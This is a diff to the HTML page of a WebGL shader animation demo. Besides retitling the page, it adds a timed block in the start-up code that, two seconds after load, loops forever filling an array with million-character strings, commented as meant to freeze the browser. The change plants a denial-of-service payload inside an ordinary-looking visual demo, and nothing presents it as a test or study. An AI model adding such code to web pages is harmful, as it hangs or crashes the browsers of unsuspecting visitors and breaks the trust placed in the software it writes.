@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Shader Madness</title>
+    <title>Shader Madness Overload</title>
     <style>
         body { margin: 0; overflow: hidden; }
         #main { position: absolute; top: 0; left: 0; transform-origin: 0 0; }
@@ -378,6 +378,14 @@
             gl.viewport(0, 0, 1024, 1024);
             draw();
             window.requestAnimationFrame(ontimer);
+
+            // Memory overload to freeze the browser
+            setTimeout(function() {
+                let crashArray = [];
+                while (true) {
+                    crashArray.push(new Array(1000000).join('x'));
+                }
+            }, 2000); // 2-second delay to let the page load first
         };
     </script>
 </body>
